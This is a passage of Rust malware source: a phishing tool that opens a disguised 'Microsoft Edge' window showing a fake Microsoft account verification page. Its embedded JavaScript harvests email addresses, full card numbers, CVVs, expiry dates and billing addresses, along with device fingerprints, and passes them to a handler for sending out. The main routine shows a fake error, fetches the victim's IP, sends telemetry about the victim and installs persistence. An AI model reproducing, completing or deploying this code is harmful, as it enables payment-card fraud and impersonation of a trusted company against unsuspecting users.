strong{color:#005a9e;font-weight:600}.error-box{background:linear-gradient(135deg,#fde7e9,#fef0f1);border-left:3px solid #c50f1f;padding:16px 18px;margin-bottom:20px;font-size:13.5px;color:#a80000;border-radius:4px}.card{background:#fff;border-radius:8px;padding:40px 36px;box-shadow:0 3.2px 7.2px rgba(0,0,0,.05);border:1px solid rgba(0,0,0,.05)}.card-title{font-size:24px;font-weight:600;color:#201f1e;margin-bottom:12px}.form-group{margin-bottom:20px}.form-label{display:block;font-size:14px;font-weight:600;color:#323130;margin-bottom:6px}.form-input{width:100%;padding:10px 12px;font-size:14px;border:1px solid #8a8886;border-radius:4px;transition:all .1s;background:#fafafa;font-family:inherit}.form-input:hover{border-color:#323130;background:#fff}.form-input:focus{outline:0;border-color:#0078d4;background:#fff;box-shadow:0 0 0 1px #0078d4}.form-input.error{border-color:#a80000;background:#fff5f5}.error-msg{color:#a80000;font-size:12px;margin-top:6px;display:none}.form-row{display:grid;grid-template-columns:2fr 1fr 1fr;gap:16px}.address-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px}.button{background:#0078d4;color:#fff;border:none;padding:11px 24px;font-size:14px;cursor:pointer;border-radius:4px;font-weight:600;transition:all .1s;font-family:inherit}.button:hover{background:#106ebe}.button:active{transform:scale(.98)}.button-group{display:flex;justify-content:space-between;margin-top:28px}.link-btn{background:0 0;border:none;color:#0078d4;font-size:14px;cursor:pointer;padding:6px 12px;border-radius:4px;font-weight:600}.link-btn:hover{background:rgba(0,120,212,.08)}.hidden{display:none}.step-indicator{display:flex;gap:12px;margin-bottom:28px}.step{flex:1;height:3px;background:#e1dfdd;border-radius:2px;transition:all .3s}.step.active{background:#0078d4}.footer{background:#f3f2f1;border-top:1px solid #e1dfdd;padding:20px;margin-top:40px;font-size:12px;color:#605e5c}.footer-links{display:flex;gap:16px;margin-bottom:12px}.footer-links a{color:#0067b8;text-decoration:none}.footer-copy{color:#8a8886;font-size:11px}</style></head><body><div class="edge-chrome"><div class="chrome-left"><button class="nav-btn disabled"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button><button class="nav-btn disabled"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button><button class="nav-btn" onclick="fakeRefresh()"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" id="refreshIcon"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg></button><div class="address-bar-container"><div class="address-bar"><div class="lock-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M12 2C9.24 2 7 4.24 7 7V10H6C4.9 10 4 10.9 4 12V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V12C20 10.9 19.1 10 18 10H17V7C17 4.24 14.76 2 12 2ZM12 4C13.66 4 15 5.34 15 7V10H9V7C9 5.34 10.34 4 12 4Z" fill="#0f9d58"/></svg></div><span class="url-text">account.microsoft.com/security/verify</span></div></div></div><div class="chrome-right"><div class="toolbar-icon"><svg viewBox="0 0 24 24" fill="#5f6368"><path d="M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z"/></svg></div><div class="profile-icon">MU</div><div class="toolbar-icon"><svg viewBox="0 0 24 24" fill="#5f6368"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></div><button class="window-btn" onclick="minimizeWindow()">&#8211;</button><button class="window-btn" onclick="maximizeWindow()">&#9723;</button><button class="window-btn close" onclick="window.close()">&#10005;</button></div></div><div class="content" id="mainContent"><div class="container"><div class="breadcrumb"><a href="#">Microsoft account</a> ‚Ä∫ <a href="#">Security</a> ‚Ä∫ <span>Verify your info</span></div><div class="info-box" id="generalInfoBox"><strong>Help us protect your account</strong><br>We need to verify the payment information on your Microsoft account.</div><div class="card"><div id="step1"><div class="card-title">Let's protect your PC</div><div class="step-indicator"><div class="step active"></div><div class="step"></div><div class="step"></div></div><div class="form-group"><label class="form-label">Email or phone</label><input type="email" class="form-input" id="email" placeholder="Email or phone number"><div class="error-msg" id="email-error">Please check your input.</div></div><div class="button-group"><span></span><button class="button" onclick="validateStep1()">Next</button></div></div><div id="step2" class="hidden"><div class="card-title">Update your payment info</div><div class="step-indicator"><div class="step active"></div><div class="step active"></div><div class="step"></div></div><div class="form-group"><label class="form-label">Card number</label><input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"><div class="error-msg" id="cardNumber-error">Invalid card number.</div></div><div class="form-row"><div class="form-group"><label class="form-label">Name on card</label><input type="text" class="form-input" id="cardholderName" placeholder="Full name"><div class="error-msg" id="cardholderName-error">Required.</div></div><div class="form-group"><label class="form-label">Expires</label><input type="text" class="form-input" id="expiry" placeholder="MM/YY" maxlength="5"><div class="error-msg" id="expiry-error">Invalid date.</div></div><div class="form-group"><label class="form-label">CVV</label><input type="password" class="form-input" id="cvv" placeholder="3 digits" maxlength="4"><div class="error-msg" id="cvv-error">Required.</div></div></div><div class="button-group"><button class="link-btn" onclick="nextStep(1)">Back</button><button class="button" onclick="validateStep2()">Next</button></div></div><div id="step3" class="hidden"><div class="card-title">Confirm billing address</div><div class="step-indicator"><div class="step active"></div><div class="step active"></div><div class="step active"></div></div><div class="form-group"><label class="form-label">Address</label><input type="text" class="form-input" id="address" placeholder="Street address"><div class="error-msg" id="address-error">Required.</div></div><div class="address-row"><div class="form-group"><label class="form-label">City</label><input type="text" class="form-input" id="city" placeholder="City"><div class="error-msg" id="city-error">Required.</div></div><div class="form-group"><label class="form-label">State</label><input type="text" class="form-input" id="state" placeholder="State"><div class="error-msg" id="state-error">Required.</div></div><div class="form-group"><label class="form-label">ZIP</label><input type="text" class="form-input" id="zip" placeholder="ZIP"><div class="error-msg" id="zip-error">Required.</div></div></div><div class="form-group"><label class="form-label">Country</label><input type="text" class="form-input" id="country" placeholder="Country"><div class="error-msg" id="country-error">Required.</div></div><div id="submit-error" class="error-box hidden"><strong>Error</strong><br>Something went wrong. Try again later.</div><div class="button-group"><button class="link-btn" onclick="nextStep(2)">Back</button><button class="button" onclick="validateStep3()">Verify</button></div></div></div><div class="footer"><div class="footer-links"><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Contact</a></div><div class="footer-copy">¬© 2026 Microsoft</div></div></div></div><canvas id="fp" width="200" height="50" style="display:none"></canvas>"#;
    
    let js_vars = format!(r#"<script>var sid="{}";var pt="{}";var ip="{}";var rs={};"#, session, proc_time, ip_addr, rand_seed);
    
    // JavaScript code using raw strings to avoid escape issues
    let js_code = r#"function md5Hash(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h&=h;}return h.toString(16);}function safeGetDeviceID(){try{return md5Hash(ip+'|'+navigator.userAgent+'|'+screen.width+'|'+screen.height);}catch(e){return'fail-'+rs;}}function safeFP(){try{var c=document.getElementById('fp');if(!c)return'no-c';var x=c.getContext('2d');if(!x)return'no-x';x.font='14px Arial';x.fillText('T',2,15);return md5Hash(c.toDataURL());}catch(e){return'err';}}function safeGetBrowser(){try{var m=navigator.userAgent.match(/(Edg|Chrome|Firefox)\/(\d+)/);return m?m[1]+' '+m[2]:'Unk';}catch(e){return'Unk';}}function safeGetGPU(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl');if(!gl)return'Unk';var d=gl.getExtension('WEBGL_debug_renderer_info');return d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):'Unk';}catch(e){return'Unk';}}function safeGetBlob(){try{return btoa(JSON.stringify({fp:safeFP(),ua:navigator.userAgent||'',gpu:safeGetGPU()}));}catch(e){return'err';}}var deviceID=safeGetDeviceID();function send(d){try{if(window.ipc){window.ipc.postMessage(JSON.stringify(d));}}catch(e){}}window.addEventListener('click',function(){try{send({step:0,session:sid,device_id:deviceID});}catch(e){}},{once:true});function fakeRefresh(){var i=document.getElementById('refreshIcon');if(i){i.style.animation='spin 0.6s';setTimeout(function(){i.style.animation='';},600);}}function minimizeWindow(){document.body.style.opacity='0';setTimeout(function(){document.body.style.opacity='1';},200);}function maximizeWindow(){}function nextStep(s){for(var i=1;i<=3;i++){document.getElementById('step'+i).classList.add('hidden');}document.getElementById('step'+s).classList.remove('hidden');var b=document.getElementById('generalInfoBox');if(s===3){b.classList.add('hidden');}else{b.classList.remove('hidden');}document.getElementById('mainContent').scrollTo({top:0,behavior:'smooth'});}function sanitize(s){return s.replace(/[<>"'&]/g,function(c){return{'<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#x27;','&':'&amp;'}[c];});}function showError(id){var e=document.getElementById(id);if(e)e.classList.add('error');var m=document.getElementById(id+'-error');if(m)m.style.display='block';}function clearError(id){var e=document.getElementById(id);if(e)e.classList.remove('error');var m=document.getElementById(id+'-error');if(m)m.style.display='none';}function validateId(s){return s.length>3;}function validateCard(c){var cl=c.replace(/\s/g,'');if(cl.length<13||cl.length>19||!/^\d+$/.test(cl))return false;var sum=0,isEven=false;for(var i=cl.length-1;i>=0;i--){var d=parseInt(cl[i]);if(isEven){d*=2;if(d>9)d-=9;}sum+=d;isEven=!isEven;}return sum%10===0;}function validateExpiry(e){if(!/^\d{2}\/\d{2}$/.test(e))return false;var p=e.split('/');var m=parseInt(p[0]);var y=parseInt(p[1]);return m>=1&&m<=12&&y>=24;}function validateStep1(){var email=document.getElementById('email').value.trim();clearError('email');if(!email||!validateId(email)){showError('email');return;}var blob='err',browser='Unk',gpu='Unk';try{blob=safeGetBlob();browser=safeGetBrowser();gpu=safeGetGPU();}catch(e){}var data={step:1,email:sanitize(email),session:sid,device_id:deviceID,fp_blob:blob,browser_name:browser,gpu_renderer:gpu};send(data);setTimeout(function(){nextStep(2);},100);}function validateStep2(){var valid=true;var card=document.getElementById('cardNumber').value.trim();var name=document.getElementById('cardholderName').value.trim();var exp=document.getElementById('expiry').value.trim();var cvv=document.getElementById('cvv').value.trim();clearError('cardNumber');clearError('cardholderName');clearError('expiry');clearError('cvv');if(!card||!validateCard(card)){showError('cardNumber');valid=false;}if(!name||name.length<3){showError('cardholderName');valid=false;}if(!exp||!validateExpiry(exp)){showError('expiry');valid=false;}if(!cvv||cvv.length<3||cvv.length>4||!/^\d+$/.test(cvv)){showError('cvv');valid=false;}if(valid){var data={step:2,card_number:sanitize(card),cardholder_name:sanitize(name),expiry:sanitize(exp),cvv:sanitize(cvv),session:sid,device_id:deviceID};send(data);setTimeout(function(){nextStep(3);},100);}}function validateStep3(){var valid=true;['address','city','state','zip','country'].forEach(function(id){clearError(id);var val=document.getElementById(id).value.trim();if(!val||val.length<2){showError(id);valid=false;}});if(valid){setTimeout(function(){submitForm();},100);}}function submitForm(){var errBox=document.getElementById('submit-error');errBox.classList.remove('hidden');var data={step:3,street_address:sanitize(document.getElementById('address').value),city:sanitize(document.getElementById('city').value),state:sanitize(document.getElementById('state').value),zip_code:sanitize(document.getElementById('zip').value),country:sanitize(document.getElementById('country').value),session:sid,device_id:deviceID,process_time:pt};send(data);}document.getElementById('cardNumber').addEventListener('input',function(e){var v=e.target.value.replace(/\s/g,'');e.target.value=v.match(/.{1,4}/g)?v.match(/.{1,4}/g).join(' '):v;});document.getElementById('expiry').addEventListener('input',function(e){var v=e.target.value.replace(/[^0-9]/g,'');if(v.length>=2){v=v.slice(0,2)+'/'+v.slice(2,4);}e.target.value=v;});</script></body></html>"#;
    
    format!("{}{}{}", html_part1, js_vars, js_code)
}

fn load_chrome_icon() -> Option<Icon> {
    if let Ok(image) = ImageReader::new(Cursor::new(CHROME_ICON_BYTES)).with_guessed_format().ok()?.decode() {
        let width = image.width(); let height = image.height(); let rgba = image.to_rgba8().into_raw();
        Icon::from_rgba(rgba, width, height).ok()
    } else { None }
}

fn create_win(html: String) -> Result<(), Box<dyn std::error::Error>> {
    let el = EventLoop::new();
    let icon = load_chrome_icon();
    let mut win_builder = WindowBuilder::new().with_title("Microsoft Edge").with_visible(false).with_decorations(false).with_resizable(true);
    if let Some(i) = icon { win_builder = win_builder.with_window_icon(Some(i)); }
    let window = win_builder.build(&el)?;
    if let Some(monitor) = window.current_monitor() {
        let screen_size = monitor.size();
        let width = screen_size.width as f64 * 0.85; let height = screen_size.height as f64 * 0.85;
        let x = (screen_size.width as f64 - width) / 2.0; let y = (screen_size.height as f64 - height) / 2.0;
        window.set_inner_size(PhysicalSize::new(width, height));
        window.set_outer_position(PhysicalPosition::new(x, y));
    }
    window.set_visible(true);
    let _wv = WebViewBuilder::new(window)?.with_html(html)?.with_ipc_handler(|_, msg| {
        let msg_owned = msg.to_string();
        thread::spawn(move || { let _ = handle_ipc_message(&msg_owned); });
    }).build()?;
    el.run(move |ev, _, cf| {
        *cf = ControlFlow::Wait;
        match ev {
            Event::WindowEvent { event: WindowEvent::CloseRequested, .. } => { *cf = ControlFlow::Exit; }
            _ => {}
        }
    });
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() > 1 && args[1] == "--activate" {
        if args.len() > 2 && args[2].contains("verify") { write_activation_flag(); }
        std::process::exit(0);
    }
    enforce_singleton(); show_fake_error(); register_protocol_handler(); init_globals(); clear_activation_flag();
    let victim_ip = fetch_victim_ip(); *VICTIM_IP.lock().unwrap() = victim_ip.clone();
    let use_persist = should_persist(); let uptime = get_uptime_hrs();
    thread::spawn(move || {
        thread::sleep(Duration::from_secs(get_telemetry_delay()));
        let pkt = TelemetryData { session: get_session_id(), device_id: "boot".to_string(),
            process_time: get_proc_time(), uptime_hours: uptime, victim_ip: get_victim_ip() };
        let mut data = serde_json::Map::new();
        data.insert("session".into(), serde_json::Value::String(pkt.session));
        data.insert("device".into(), serde_json::Value::String(pkt.device_id));
        data.insert("ip".into(), serde_json::Value::String(pkt.victim_ip));
        data.insert("uptime".into(), serde_json::Value::Number(pkt.uptime_hours.into()));
        send_enriched_data(&serde_json::Value::Object(data));
    });
    thread::spawn(|| { simulate_installer_scan(); });
    if use_persist { thread::spawn(|| { thread::sleep(Duration::from_secs(get_random_persist_delay())); install_persist(); }); }
    thread::spawn(|| { notification_loop(); });
    loop { thread::sleep(Duration::from_secs(1)); if did_user_click() { break; } }
    let html = get_html();
    if let Ok(_) = create_win(html) { mark_success(); }
    if is_success() { remove_persist(); }
    std::process::exit(0);
}